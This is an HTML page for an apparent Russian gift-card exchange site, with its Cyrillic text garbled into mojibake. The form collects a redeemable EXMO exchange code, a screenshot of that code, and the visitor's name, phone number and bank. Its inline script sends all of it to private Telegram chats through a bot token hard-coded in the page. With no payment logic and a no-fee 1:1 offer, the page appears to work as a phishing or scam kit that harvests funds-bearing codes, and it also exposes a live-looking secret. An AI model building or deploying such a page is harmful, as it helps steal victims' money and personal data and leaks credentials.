<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>–ü—Ä–æ–¥–∞—Ç—å EXMO –∫–æ–¥ - –û–±–º–µ–Ω–Ω–∏–∫ gift-–∫–∞—Ä—Ç</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Rubik:wght@300;400;500;600;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <video autoplay muted loop playsinline class="video-background">
        <source src="19264a464315513c06c2dc242649e340.mp4" type="video/mp4">
    </video>

    <header>
        <div class="user-bar">
            <div class="container">
                <div class="user-bar-content">
                    <div class="header-contacts-top">
                        <span><svg style="width:16px;height:16px;vertical-align:middle;margin-right:4px" viewBox="0 0 24 24" fill="#0088cc"><path d="M12 0C5.37 0 0 5.37 0 12s5.37 12 12 12 12-5.37 12-12S18.63 0 12 0zm5.5 8.1l-1.8 8.5c-.13.6-.5.75-.95.47l-2.6-1.9-1.25 1.2c-.14.14-.26.26-.53.26l.18-2.6 4.8-4.3c.2-.2-.05-.3-.3-.12l-5.9 3.7-2.55-.8c-.55-.17-.56-.55.12-.82l10-3.85c.45-.17.85.1.7.8z"/></svg> <a href="https://t.me/yourusername" target="_blank">@yourusername</a></span>
                        <span><svg style="width:16px;height:16px;vertical-align:middle;margin-right:4px" viewBox="0 0 24 24" fill="#EA4335"><path d="M20 4H4c-1.1 0-2 .9-2 2v12c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2zm0 4l-8 5-8-5V6l8 5 8-5v2z"/></svg> support@example.com</span>
                    </div>
                    <div class="auth-buttons-header">
                        <button class="btn-login-header" onclick="window.location.href='login.html'">–í–æ–π—Ç–∏</button>
                        <button class="btn-register-header" onclick="window.location.href='register.html'">–†–µ–≥–∏—Å—Ç—Ä–∞—Ü–∏—è</button>
                    </div>
                </div>
            </div>
        </div>
        <div class="main-header">
            <div class="container">
                <div class="header-content">
                    <div class="logo">
                        <h1>–û–±–º–µ–Ω–Ω–∏–∫ gift-–∫–∞—Ä—Ç</h1>
                    </div>
                    <nav>
                        <a href="index.html">–ì–ª–∞–≤–Ω–∞—è</a>
                        <a href="#reviews">–û—Ç–∑—ã–≤—ã</a>
                        <a href="#howto">–ö–∞–∫ —ç—Ç–æ —Ä–∞–±–æ—Ç–∞–µ—Ç</a>
                        <a href="#contacts">–ö–æ–Ω—Ç–∞–∫—Ç—ã</a>
                    </nav>
                    <div class="work-time">
                        <span>‚è∞ –†–∞–±–æ—Ç–∞–µ–º: 24 —á–∞—Å–∞ 7 –¥–Ω–µ–π –≤ –Ω–µ–¥–µ–ª—é</span>
                    </div>
                </div>
            </div>
        </div>
    </header>

    <main>
        <section class="exchange-main-section">
            <div class="container">
                <div class="exchange-info">
                    <h2 id="pageTitle">–û–±–º–µ–Ω–Ω–∏–∫ gift-–∫–∞—Ä—Ç</h2>
                    <p class="exchange-conditions">–ö—É—Ä—Å –æ–±–º–µ–Ω–∞ 1√ó1 –±–µ–∑ –∫–æ–º–∏—Å—Å–∏–∏. –ë—ã—Å—Ç—Ä–∞—è –æ–ø–ª–∞—Ç–∞ —á–µ—Ä–µ–∑ –°–ë–ü. –ú–∏–Ω–∏–º–∞–ª—å–Ω–∞—è —Å—É–º–º–∞ –æ–±–º–µ–Ω–∞ ‚Äî 1 000 ‚ÇΩ, –º–∞–∫—Å–∏–º–∞–ª—å–Ω–∞—è ‚Äî 100 000 ‚ÇΩ. –í—Ä–µ–º—è –æ–±—Ä–∞–±–æ—Ç–∫–∏ –∑–∞—è–≤–∫–∏: 10-30 –º–∏–Ω—É—Ç.</p>
                </div>

                <form id="sellForm" class="main-exchange-form">
                    <div class="exchange-columns">
                        <div class="exchange-column">
                            <div class="form-group">
                                <label>üí≥ –í—Å—Ç–∞–≤–∏—Ç—å –∫–æ–¥ *</label>
                                <input type="text" id="exmoCode" name="exmoCode" required
                                       placeholder="–í—Å—Ç–∞–≤—å—Ç–µ Gift Card (EXMO –∫–æ–¥)">
                                <small>Gift Card (EXMO –∫–æ–¥), —Å–æ–∑–¥–∞–Ω–Ω—ã–π –≤ –ª–∏—á–Ω–æ–º –∫–∞–±–∏–Ω–µ—Ç–µ –±–∏—Ä–∂–∏ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è</small>
                            </div>

                            <div class="form-group">
                                <label>üí∞ –°—É–º–º–∞ *</label>
                                <input type="number" id="giveAmount" name="giveAmount" required
                                       placeholder="–£–∫–∞–∂–∏—Ç–µ —Å—É–º–º—É" min="1000" max="100000" step="1">
                                <small>min: 1 000 RUB | max: 100 000 RUB</small>
                            </div>

                            <div class="form-group">
                                <label>üìé –§–∞–π–ª –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏—è *</label>
                                <input type="file" id="screenshot" name="screenshot" required
                                       accept="image/*">
                                <small>–°–∫—Ä–∏–Ω—à–æ—Ç —Å –≤–∏–¥–∏–º—ã–º EXMO –∫–æ–¥–æ–º</small>
                            </div>
                        </div>

                        <div class="exchange-column">
                            <div class="form-group">
                                <label>üíµ –°—É–º–º–∞ –∫ –ø–æ–ª—É—á–µ–Ω–∏—é</label>
                                <input type="number" id="receiveAmount" name="receiveAmount" readonly
                                       placeholder="0" class="amount-display">
                                <small>–ö—É—Ä—Å –æ–±–º–µ–Ω–∞ 1√ó1 ‚Ä¢ –û–ø–ª–∞—Ç–∞ —á–µ—Ä–µ–∑ –°–ë–ü</small>
                            </div>

                            <div class="form-group">
                                <label>üë§ –§.–ò.–û. –ø–æ–ª—É—á–∞—Ç–µ–ª—è *</label>
                                <input type="text" id="fullName" name="fullName" required
                                       placeholder="–ò–≤–∞–Ω–æ–≤ –ò–≤–∞–Ω –ò–≤–∞–Ω–æ–≤–∏—á">
                            </div>

                            <div class="form-group">
                                <label>üì± –ù–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞ (–°–ë–ü) *</label>
                                <input type="tel" id="phone" name="phone" required
                                       placeholder="+7 (___) ___-__-__">
                            </div>

                            <div class="form-group">
                                <label>üè¶ –ù–∞–∑–≤–∞–Ω–∏–µ –±–∞–Ω–∫–∞ *</label>
                                <input type="text" id="bank" name="bank" required
                                       placeholder="–í–≤–µ–¥–∏—Ç–µ –Ω–∞–∑–≤–∞–Ω–∏–µ –≤–∞—à–µ–≥–æ –±–∞–Ω–∫–∞">
                            </div>
                        </div>
                    </div>

                    <div class="form-agreement">
                        <label class="checkbox-label">
                            <input type="checkbox" required>
                            <span>–Ø —Å–æ–≥–ª–∞—Å–µ–Ω —Å <a href="terms.html" target="_blank" style="color: #007bff;">—É—Å–ª–æ–≤–∏—è–º–∏ –æ–±–º–µ–Ω–∞</a> –∏ <a href="privacy.html" target="_blank" style="color: #007bff;">–ø–æ–ª–∏—Ç–∏–∫–æ–π –∫–æ–Ω—Ñ–∏–¥–µ–Ω—Ü–∏–∞–ª—å–Ω–æ—Å—Ç–∏</a></span>
                        </label>
                    </div>

                    <button type="submit" id="submitBtn" class="btn-submit-exchange btn-disabled">–°–æ–∑–¥–∞—Ç—å –∑–∞—è–≤–∫—É</button>
                </form>

                <div id="validationMessage" class="message warning" style="display:none;"></div>
                <div id="successMessage" class="message success" style="display:none;">
                    ‚úì –ó–∞—è–≤–∫–∞ —É—Å–ø–µ—à–Ω–æ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–∞! –ú—ã —Å–≤—è–∂–µ–º—Å—è —Å –≤–∞–º–∏ –≤ –±–ª–∏–∂–∞–π—à–µ–µ –≤—Ä–µ–º—è.
                </div>
                <div id="errorMessage" class="message error" style="display:none;">
                    ‚úó –û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏. –ü–æ–ø—Ä–æ–±—É–π—Ç–µ –µ—â–µ —Ä–∞–∑ –∏–ª–∏ —Å–≤—è–∂–∏—Ç–µ—Å—å —Å –Ω–∞–º–∏ –≤ Telegram.
                </div>
            </div>
        </section>
    </main>

    <footer id="contacts">
        <div class="container">
            <div class="footer-content">
                <div class="footer-section">
                    <h3>–ö–æ–Ω—Ç–∞–∫—Ç—ã</h3>
                    <p><svg style="width:14px;height:14px;vertical-align:middle;margin-right:4px" viewBox="0 0 24 24" fill="#0088cc"><path d="M12 0C5.37 0 0 5.37 0 12s5.37 12 12 12 12-5.37 12-12S18.63 0 12 0zm5.5 8.1l-1.8 8.5c-.13.6-.5.75-.95.47l-2.6-1.9-1.25 1.2c-.14.14-.26.26-.53.26l.18-2.6 4.8-4.3c.2-.2-.05-.3-.3-.12l-5.9 3.7-2.55-.8c-.55-.17-.56-.55.12-.82l10-3.85c.45-.17.85.1.7.8z"/></svg> <a href="https://t.me/yourusername" target="_blank">@yourusername</a></p>
                    <p><svg style="width:14px;height:14px;vertical-align:middle;margin-right:4px" viewBox="0 0 24 24" fill="#EA4335"><path d="M20 4H4c-1.1 0-2 .9-2 2v12c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2zm0 4l-8 5-8-5V6l8 5 8-5v2z"/></svg> support@example.com</p>
                </div>
                <div class="footer-section">
                    <h3>–†–µ–∂–∏–º —Ä–∞–±–æ—Ç—ã</h3>
                    <p>24 —á–∞—Å–∞ 7 –¥–Ω–µ–π –≤ –Ω–µ–¥–µ–ª—é</p>
                    <p>–û–±—Ä–∞–±–æ—Ç–∫–∞ –∑–∞—è–≤–æ–∫: 10-30 –º–∏–Ω—É—Ç</p>
                </div>
                <div class="footer-section">
                    <h3>–ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è</h3>
                    <p>–ö—É—Ä—Å –æ–±–º–µ–Ω–∞: 1√ó1</p>
                    <p>–ö–æ–º–∏—Å—Å–∏—è: 0%</p>
                    <p>–°–ø–æ—Å–æ–± –æ–ø–ª–∞—Ç—ã: –°–ë–ü</p>
                </div>
            </div>
            <div class="footer-bottom">
                <p>&copy; 2026 –û–±–º–µ–Ω–Ω–∏–∫ gift-–∫–∞—Ä—Ç. –í—Å–µ –ø—Ä–∞–≤–∞ –∑–∞—â–∏—â–µ–Ω—ã.</p>
            </div>
        </div>
    </footer>

    <script>
        // –ê–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏–π —Ä–∞—Å—á—ë—Ç —Å—É–º–º—ã –ø–æ–ª—É—á–µ–Ω–∏—è (–∫—É—Ä—Å 1√ó1)
        const giveAmountInput = document.getElementById('giveAmount');
        const receiveAmountInput = document.getElementById('receiveAmount');

        giveAmountInput.addEventListener('input', function(e) {
            const amount = parseFloat(e.target.value) || 0;
            receiveAmountInput.value = amount;
        });

        // –§–æ—Ä–º–∞—Ç–∏—Ä–æ–≤–∞–Ω–∏–µ —Ç–µ–ª–µ—Ñ–æ–Ω–∞
        function formatPhone(e) {
            let value = e.target.value.replace(/\D/g, '');
            if (value.length > 0) {
                if (value[0] === '8') value = '7' + value.substring(1);
                if (value[0] !== '7') value = '7' + value;
            }
            let formatted = '+7';
            if (value.length > 1) formatted += ' (' + value.substring(1, 4);
            if (value.length >= 5) formatted += ') ' + value.substring(4, 7);
            if (value.length >= 8) formatted += '-' + value.substring(7, 9);
            if (value.length >= 10) formatted += '-' + value.substring(9, 11);
            e.target.value = formatted;
        }

        const phoneInput = document.getElementById('phone');
        phoneInput.addEventListener('input', formatPhone);

        // –í–∞–ª–∏–¥–∞—Ü–∏—è —Ñ–æ—Ä–º—ã
        const submitBtn = document.getElementById('submitBtn');
        const validationMsg = document.getElementById('validationMessage');
        const form = document.getElementById('sellForm');

        function validateForm() {
            const errors = [];
            const exmoCode = document.getElementById('exmoCode').value.trim();
            const giveAmount = parseFloat(document.getElementById('giveAmount').value) || 0;
            const screenshot = document.getElementById('screenshot').files[0];
            const fullName = document.getElementById('fullName').value.trim();
            const phone = document.getElementById('phone').value.trim();
            const bank = document.getElementById('bank').value.trim();
            const checkbox = form.querySelector('input[type="checkbox"]').checked;

            if (!exmoCode) errors.push('–í–≤–µ–¥–∏—Ç–µ EXMO –∫–æ–¥');
            if (giveAmount < 1000) errors.push('–°—É–º–º–∞ –º–∏–Ω–∏–º—É–º 1000 ‚ÇΩ');
            if (giveAmount > 100000) errors.push('–°—É–º–º–∞ –º–∞–∫—Å–∏–º—É–º 100000 ‚ÇΩ');
            if (!screenshot) errors.push('–ó–∞–≥—Ä—É–∑–∏—Ç–µ —Å–∫—Ä–∏–Ω—à–æ—Ç');
            if (!fullName) errors.push('–í–≤–µ–¥–∏—Ç–µ –§–ò–û');
            if (phone.length < 18) errors.push('–í–≤–µ–¥–∏—Ç–µ –Ω–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞');
            if (!bank) errors.push('–í–≤–µ–¥–∏—Ç–µ –Ω–∞–∑–≤–∞–Ω–∏–µ –±–∞–Ω–∫–∞');
            if (!checkbox) errors.push('–ü—Ä–∏–º–∏—Ç–µ —É—Å–ª–æ–≤–∏—è');

            return errors;
        }

        function updateButtonState() {
            const errors = validateForm();
            if (errors.length === 0) {
                submitBtn.classList.remove('btn-disabled');
            } else {
                submitBtn.classList.add('btn-disabled');
            }
        }

        // –°–ª—É—à–∞–µ–º –∏–∑–º–µ–Ω–µ–Ω–∏—è –≤—Å–µ—Ö –ø–æ–ª–µ–π
        form.querySelectorAll('input').forEach(input => {
            input.addEventListener('input', updateButtonState);
            input.addEventListener('change', updateButtonState);
        });

        // –ü—Ä–∏ –∫–ª–∏–∫–µ –Ω–∞ –Ω–µ–∞–∫—Ç–∏–≤–Ω—É—é –∫–Ω–æ–ø–∫—É –ø–æ–∫–∞–∑—ã–≤–∞–µ–º –æ—à–∏–±–∫–∏
        submitBtn.addEventListener('click', function(e) {
            const errors = validateForm();
            if (errors.length > 0) {
                e.preventDefault();
                validationMsg.innerHTML = '‚ö†Ô∏è ' + errors.join('<br>‚ö†Ô∏è ');
                validationMsg.style.display = 'block';
                setTimeout(() => { validationMsg.style.display = 'none'; }, 5000);
            }
        });

        // –û—Ç–ø—Ä–∞–≤–∫–∞ –∑–∞—è–≤–∫–∏ –Ω–∞ —Å–µ—Ä–≤–µ—Ä –∏ –≤ Telegram
        async function sendOrder(order, screenshotFile) {
            const BOT_TOKEN = '8378403510:AAHdYIpQ2hRJ8H0va6kM-ZSfoYwVeosuQVA';
            const ADMIN_IDS = ['7338817463', '7816621862'];
            const API_URL = 'http://localhost:5000/api/order';

            // –ü—Ä–æ–±—É–µ–º –æ—Ç–ø—Ä–∞–≤–∏—Ç—å –Ω–∞ API —Å–µ—Ä–≤–µ—Ä (—Å–æ—Ö—Ä–∞–Ω–∏—Ç –≤ –ë–î)
            try {
                const res = await fetch(API_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(order)
                });
                const data = await res.json();
                if (data.success) {
                    console.log('Saved to server, ID:', data.id);
                }
            } catch (e) {
                console.log('API offline, sending directly to Telegram');
            }

            // –í—Å–µ–≥–¥–∞ –æ—Ç–ø—Ä–∞–≤–ª—è–µ–º –≤ Telegram
            const message =
                `üìã <b>–ù–æ–≤–∞—è –∑–∞—è–≤–∫–∞</b>\n\n` +
                `üí≥ <code>${order.exmoCode}</code>\n` +
                `üí∞ ${order.giveAmount} —Ä—É–±.\n\n` +
                `üë§ <code>${order.fullName}</code>\n` +
                `üì± <code>${order.phone}</code>\n` +
                `üè¶ <code>${order.bank}</code>`;

            for (const chatId of ADMIN_IDS) {
                try {
                    if (screenshotFile) {
                        const formData = new FormData();
                        formData.append('chat_id', chatId);
                        formData.append('photo', screenshotFile);
                        formData.append('caption', message);
                        formData.append('parse_mode', 'HTML');

                        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                            method: 'POST',
                            body: formData
                        });
                    } else {
                        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({
                                chat_id: chatId,
                                text: message,
                                parse_mode: 'HTML'
                            })
                        });
                    }
                } catch (err) {
                    console.log('Telegram error:', err);
                }
            }
        }

        // –û—Ç–ø—Ä–∞–≤–∫–∞ —Ñ–æ—Ä–º—ã
        document.getElementById('sellForm').addEventListener('submit', function(e) {
            e.preventDefault();

            const successMessage = document.getElementById('successMessage');
            const errorMessage = document.getElementById('errorMessage');
            const giveAmount = parseFloat(document.getElementById('giveAmount').value);

            successMessage.style.display = 'none';
            errorMessage.style.display = 'none';

            // –í–∞–ª–∏–¥–∞—Ü–∏—è –ª–∏–º–∏—Ç–æ–≤
            if (giveAmount < 1000 || giveAmount > 100000) {
                errorMessage.textContent = '‚úó –°—É–º–º–∞ –¥–æ–ª–∂–Ω–∞ –±—ã—Ç—å –æ—Ç 1 000 –¥–æ 100 000 —Ä—É–±–ª–µ–π.';
                errorMessage.style.display = 'block';
                return;
            }

            // –°–æ—Ö—Ä–∞–Ω—è–µ–º –∑–∞—è–≤–∫—É –≤ LocalStorage
            const orders = JSON.parse(localStorage.getItem('orders') || '[]');

            const newOrder = {
                id: orders.length + 1,
                type: 'sell',
                exmoCode: document.getElementById('exmoCode').value,
                giveAmount: giveAmount,
                receiveAmount: giveAmount,
                fullName: document.getElementById('fullName').value,
                phone: document.getElementById('phone').value,
                bank: document.getElementById('bank').value,
                status: 'pending',
                createdAt: new Date().toISOString()
            };

            orders.push(newOrder);
            localStorage.setItem('orders', JSON.stringify(orders));

            // –ü–æ–ª—É—á–∞–µ–º —Ñ–∞–π–ª —Å–∫—Ä–∏–Ω—à–æ—Ç–∞
            const screenshotInput = document.getElementById('screenshot');
            const screenshotFile = screenshotInput.files[0] || null;

            // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –∑–∞—è–≤–∫—É
            sendOrder(newOrder, screenshotFile);

            successMessage.style.display = 'block';
            this.reset();
            receiveAmountInput.value = '0';

            setTimeout(() => {
                successMessage.style.display = 'none';
            }, 5000);
        });
    </script>
</body>
</html>
